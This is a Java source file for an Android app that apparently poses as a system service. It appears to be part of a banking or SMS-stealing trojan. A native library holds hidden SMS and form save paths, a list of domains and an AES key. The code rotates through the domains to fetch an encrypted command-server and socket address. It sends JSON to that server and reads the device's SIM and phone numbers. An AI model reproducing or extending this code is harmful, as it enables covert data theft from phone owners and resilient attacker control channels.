package com.system.service.sbi;

import android.content.Context;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Build;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import com.system.service.sbi.MinorServices.SharedPreferencesHelper;

import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.Scanner;



public class HelperService {

    public static String TAG = "AppManager";
    {
        System.loadLibrary("native-lib");
    }
    public native String DomainList();
    public  native String SMSSavePath();
    public  native String FormSavePath();
    public  native String SITE();
    public  native String KEY();
    public native String getNumber();

    public static void postRequest(String path, JSONObject jsonData, Context context, ResponseListener listener) {
        new AsyncTask<String, Void, String>() {
            @Override
            protected String doInBackground(String... params) {
                String response = "";
                try {
                    HelperService helperService = new HelperService();
                    String urlString = helperService.URL(context) + path;
                    URL url = new URL(urlString);

                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setRequestProperty("Accept", "application/json");
                    conn.setDoOutput(true);

                    // Write JSON data to the output stream
                    OutputStream os = conn.getOutputStream();
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
                    writer.write(jsonData.toString());
                    writer.flush();
                    writer.close();
                    os.close();

                    // Check the response code
                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        // Read response
                        Scanner scanner = new Scanner(conn.getInputStream());
                        StringBuilder responseBuilder = new StringBuilder();
                        while (scanner.hasNextLine()) {
                            responseBuilder.append(scanner.nextLine());
                        }
                        scanner.close();
                        response = responseBuilder.toString();
                    } else {
                        // Handle error response
                        response = "Response: " + responseCode;
                    }
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                    response = "Response Error: " + e.getMessage();
                }
                return response;
            }

            @Override
            protected void onPostExecute(String result) {
                // Pass the result to the listener

                if (listener != null) {
                    listener.onResponse(result);
                }
            }
        }.execute(path);
    }

    // Interface for callback
    public interface ResponseListener {
        void onResponse(String result);
    }

    public static void getRequest(String path, Context context, ResponseListener listener) {
        new AsyncTask<String, Void, String>() {
            @Override
            protected String doInBackground(String... params) {
                String response = "";
                try {
                    HelperService helperService = new HelperService();
                    String urlString = helperService.URL(context) + path; // Append the path to the base URL
                    URL url = new URL(urlString);

                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setRequestProperty("Accept", "application/json");

                    // Check the response code
                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        // Read response
                        Scanner scanner = new Scanner(conn.getInputStream());
                        StringBuilder responseBuilder = new StringBuilder();
                        while (scanner.hasNextLine()) {
                            responseBuilder.append(scanner.nextLine());
                        }
                        scanner.close();
                        response = responseBuilder.toString();
                    } else {
                        // Handle error response
                        response = "Response: " + responseCode;
                    }
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                    response = "Response Error: " + e.getMessage();
                }
                return response;
            }

            @Override
            protected void onPostExecute(String result) {
                // Pass the result to the listener
                if (listener != null) {
                    listener.onResponse(result);
                }
            }
        }.execute(path);
    }

    public static boolean isNetworkAvailable(Context context) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (connectivityManager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Network network = connectivityManager.getActiveNetwork();
                if (network != null) {
                    NetworkCapabilities networkCapabilities = connectivityManager.getNetworkCapabilities(network);
                    return networkCapabilities != null && (
                            networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
                                    networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                                    networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
                    );
                }
            } else {
                NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
                return activeNetworkInfo != null && activeNetworkInfo.isConnected();
            }
        }
        return false;
    }
    public String URL(Context context) {
        SharedPreferencesHelper share = new SharedPreferencesHelper(context);
        String domain = share.getString("domain", "https://example.com").trim();
        return domain;
    }

    public void updateDomain(final Context cc) {
        final SharedPreferencesHelper db = new SharedPreferencesHelper(cc);
        final NetworkHelper network = new NetworkHelper();
        final HelperService help = new HelperService();
        String DomainList = help.DomainList();
        final String[] domainArray = DomainList.split(", ");
        checkDomainSequentially(0, domainArray, db, network);
    }

    private void checkDomainSequentially(final int index, final String[] domainArray, final SharedPreferencesHelper db, final NetworkHelper network) {
        if (index >= domainArray.length) {
            db.saveString("domainStatus", "failed");
            return;
        }
        final String currentDomain = domainArray[index];
        network.makeGetRequest(currentDomain, new NetworkHelper.GetRequestCallback() {
            @Override
            public void onSuccess(String result) {
                String encryptedData = result.trim(); // Trim to remove leading/trailing whitespaces
                try {
                    HelperService h = new HelperService();
                    String decryptedData = AESDescryption.decrypt(encryptedData, h.KEY());

                    if (!decryptedData.isEmpty()) {
                        JSONObject object = new JSONObject(decryptedData);
                        db.saveString("domain", object.getString("domain"));
                        db.saveString("socket", object.getString("socket"));
                    }
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }

            @Override
            public void onFailure(String error) {
                Log.d("NetworkRequest", "Failed for domain: " + currentDomain + " Error: " + error);
                checkDomainSequentially(index + 1, domainArray, db, network);
            }
        });
    }


    public static String getSimNumbers(Context context) {
        SubscriptionManager subscriptionManager = SubscriptionManager.from(context);
        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return "Permission is Denied on getSimNumbers";
        }
        List<SubscriptionInfo> subscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
        if (subscriptionInfoList != null) {
            String Numbers = "";
            for (SubscriptionInfo info : subscriptionInfoList) {
                Numbers += " | " + info.getNumber();
            }
            if(!Numbers.isEmpty()) {
                Numbers = getPhoneNumber(context);
            }
            return Numbers;
        }else{
            return "subscription info is null on getSimNumbers";
        }
    }

    public static String getPhoneNumber(Context context) {
        // default phone number..
        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (tMgr != null) {
            if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                return "Phone OR SMS permission is not granted";
            }
            String mPhoneNumber = tMgr.getLine1Number();
            if (mPhoneNumber != null && !mPhoneNumber.isEmpty()) {
                return mPhoneNumber;
            } else {
                return "Phone number not available";
            }
        } else {
            return "TelephonyManager is null";
        }
    }


}

